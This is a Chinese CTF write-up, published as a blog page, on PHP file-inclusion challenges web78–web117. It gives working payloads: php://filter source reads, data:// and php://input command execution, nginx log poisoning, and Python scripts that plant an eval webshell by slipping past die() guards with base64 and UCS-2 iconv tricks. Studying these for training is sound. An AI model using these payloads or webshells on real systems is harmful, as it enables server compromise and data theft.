@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="文件包含web78123456if(isset($_GET[&#x27;file&#x27;]))&#123;    $file &#x3D; $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125; 首先这是一个file关键字的get参数传递，php:&#x2F;&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含">
+<meta property="og:url" content="http://example.com/2024/01/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="枫叶苑">
+<meta property="og:description" content="文件包含web78123456if(isset($_GET[&#x27;file&#x27;]))&#123;    $file &#x3D; $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125; 首先这是一个file关键字的get参数传递，php:&#x2F;&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image-68.png">
+<meta property="og:image" content="http://example.com/image-69.png">
+<meta property="og:image" content="http://example.com/image-70.png">
+<meta property="article:published_time" content="2024-01-12T11:31:36.000Z">
+<meta property="article:modified_time" content="2024-01-12T11:32:06.645Z">
+<meta property="article:author" content="作者:ignite">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image-68.png">
+
+<link rel="canonical" href="http://example.com/2024/01/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>文件包含 | 枫叶苑</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">枫叶苑</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/01/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="作者:ignite">
+      <meta itemprop="description" content="选择有时候比努力更重要">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="枫叶苑">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件包含
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-01-12 19:31:36 / 修改时间：19:32:06" itemprop="dateCreated datePublished" datetime="2024-01-12T19:31:36+08:00">2024-01-12</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先这是一个file关键字的get参数传递，php:&#x2F;&#x2F;是一种协议名称，php:&#x2F;&#x2F;filter&#x2F;是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F;表示读取的方式是base64编码后，resource&#x3D;index.php表示目标文件为index.php。</p>
+<p>通过传递这个参数可以得到index.php的源码，下面说说为什么，看到源码中的include函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码。</p>
+<p>而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，因为是base64编码格式，所以执行不成功，返回源码，所以我们得到了源码的base64格式，解码即可。<br>payload:<br><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
+<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>把php替换了,但是没有过滤大小写。改用Php绕过<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=Php://input</span><br><span class="line">​post：&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">有时候浏览的HackBar不好用，post过不去，需要用burpsuite。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">或者用data协议：</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br><span class="line">----PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=Php://input</span><br><span class="line">​post：&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">有时候浏览的HackBar不好用，post过不去，需要用burpsuite。</span><br></pre></td></tr></table></figure>
+<p>不过注意这次文件名字改成了fl0g.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=Php://input</span><br><span class="line">​post：&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<p>日志文件还可以这样用：在User-Agent处写php语句。利用 UA 插入 payload 到日志文件，之后再包含它。<br><code>?file=/var/log/nginx/access.log</code><br><img src="/image-68.png" alt="Alt text"></p>
+<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用上一题的日志文件包含<br>这次写个脚本来跑</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://25ec31ca-7abd-4baa-beb0-b6abe20faca2.challenge.ctf.show/&quot;</span> + <span class="string">&quot;?file=/var/log/nginx/access.log&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;dotast&#x27;</span>: <span class="string">&#x27;system(&quot;cat fl0g.php&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = requests.get(url=url, headers=headers)</span><br><span class="line">result = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span>(result.text)</span><br></pre></td></tr></table></figure>
+<p><img src="/image-69.png" alt="Alt text"></p>
+<h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>$file为写入文件的路径,进行了一次url解码,而浏览器也要进行一次url解码,所以我们对输入的payload进行2次url编码就可以绕过过滤</p>
+<p>分析一下源码，get传入file，post传入content，但$content在开头增加了die函数，即使我们写入一句话也会先die，导致无法执行；并且还对file进行了url解码<br>我们可以使用base64的方式写入文件再进行decode，base64编码只包含64个可打印字符，而php解码base64时遇到不在其中的字符，会忽略掉，将合法字符进行组合变成一个字符串进行解码，所以<?php die('大佬别秀了');?>对其解码后，只有phpdie六个字符组成字符串进行解码，思路已经很清晰了，下面讲讲怎么做</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一，get传参file写入文件并且进行base64解码，即</span><br><span class="line">?file=php://filter/write=convert.base64-decode/resource=datast.php</span><br><span class="line">因为源码中有一次urldecode，所以我们需要对其进行两次url编码</span><br><span class="line">%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%36%34%25%36%31%25%37%34%25%36%31%25%37%33%25%37%34%25%32%45%25%37%30%25%36%38%25%37%30</span><br><span class="line">第二，post传参content为base64编码后的一句话木马，但注意的是前面剩下phpdie，一共6个字符，所以需要再加2个字符变8个</span><br><span class="line">因为base64算法解码时是4个byte一组所以在前面补aa</span><br><span class="line">content=aaPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==</span><br><span class="line">----&lt;?php @eval($_POST[pass]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后访问flag.php<br><img src="/image-70.png" alt="Alt text"><br>然后 base64编码<?php system('tac fl0g.php');?><br>pass&#x3D;aaPD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTs&#x2F;Pg&#x3D;&#x3D;<br>—-pass&#x3D;system(“cat fl0g.php”);<br>拿到flag</p>
+<p>或者直接用脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d2dea66a-2a0c-4d95-be8c-128755fb86d9.challenge.ctf.show/&quot;</span></span><br><span class="line"><span class="comment">#经过两次url编码的php://filter/write=convert.base64-decode/resource=dotast.php</span></span><br><span class="line">get_data = <span class="string">&quot;%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%36%34%25%36%31%25%37%34%25%36%31%25%37%33%25%37%34%25%32%45%25%37%30%25%36%38%25%37%30&quot;</span></span><br><span class="line">get_url = url + <span class="string">&quot;?file=&quot;</span> + get_data</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;nbPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=get_url, data=data)</span><br><span class="line">shell_url = url + <span class="string">&quot;datast.php&quot;</span></span><br><span class="line">test = requests.get(shell_url)</span><br><span class="line"><span class="keyword">if</span>(test.status_code == <span class="number">200</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]getshell成功&quot;</span>)</span><br><span class="line">    shell_data = &#123;</span><br><span class="line">        <span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;system(&quot;cat fl0g.php&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = requests.post(url=shell_url, data=shell_data)</span><br><span class="line">    <span class="built_in">print</span>(result.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用data伪协议，但因为过滤了php所以我们使用base64编码一下</p>
+<figure class="highlight plaintext"><figcaption><span>system('ls'); ?>```**加密后在末尾的</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">![Alt text](image-71.png)</span><br><span class="line"></span><br><span class="line">因为过滤了=，所以payload:</span><br><span class="line">```?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg```</span><br><span class="line"></span><br><span class="line">![Alt text](image-72.png)</span><br><span class="line"></span><br><span class="line">![Alt text](image-73.png)</span><br><span class="line">**去掉=**</span><br><span class="line">再使用```?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## web117</span><br><span class="line">```php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">$contents=$_POST[&#x27;contents&#x27;];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents); </span><br></pre></td></tr></table></figure>
+<p>这题和前面的有点类似，也是绕过contents前面的死亡代码，只是把一些可利用的协议和编码给ban了，但还可以利用其它编码器进行绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用</span><br><span class="line">iconv ( string $in_charset , string $out_charset , string $str )：将字符串$str从in_charset编码转换到$out_charset</span><br><span class="line">这里引入usc-2的概念，作用是对目标字符串每两位进行一反转，值得注意的是，因为是两位所以字符串需要保持在偶数位上</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;经过一次反转:&quot;</span>.<span class="variable">$result</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;经过第二次反转:&quot;</span>.<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果如下：</span></span><br><span class="line"><span class="comment">//经过一次反转:?&lt;hp pe@av(l_$OPTSd[tosa]t;)&gt;?</span></span><br><span class="line"><span class="comment">//经过第二次反转:&lt;?php @eval($_POST[dotast]);?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，经过两次反转之后代码又组装回来，思路就是用经过一次反转后的webshell和死亡代码<?php die();?>一起组合之后，经过第二次反转我们的webshell就恢复正常了，而死亡代码会被反转打乱不能执行<br>所以payload也就出来了，把前面的脚本改一下即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c3348474-7cde-4a73-aa66-73a6ab1533ce.challenge.ctf.show/&quot;</span></span><br><span class="line">get_data = <span class="string">&quot;php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=dotast.php&quot;</span></span><br><span class="line">get_url = url + <span class="string">&quot;?file=&quot;</span> + get_data</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;contents&#x27;</span>: <span class="string">&#x27;?&lt;hp pe@av(l_$OPTSd[tosa]t;)&gt;?&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=get_url, data=data)</span><br><span class="line">shell_url = url + <span class="string">&quot;dotast.php&quot;</span></span><br><span class="line">test = requests.get(shell_url)</span><br><span class="line"><span class="keyword">if</span>(test.status_code == <span class="number">200</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]getshell成功&quot;</span>)</span><br><span class="line">    shell_data = &#123;</span><br><span class="line">        <span class="string">&#x27;dotast&#x27;</span>: <span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    result = requests.post(url=shell_url, data=shell_data)</span><br><span class="line">    <span class="built_in">print</span>(result.text)</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/01/12/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="prev" title="命令执行">
+      <i class="fa fa-chevron-left"></i> 命令执行
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/01/12/php%E7%89%B9%E6%80%A7/" rel="next" title="php特性">
+      php特性 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
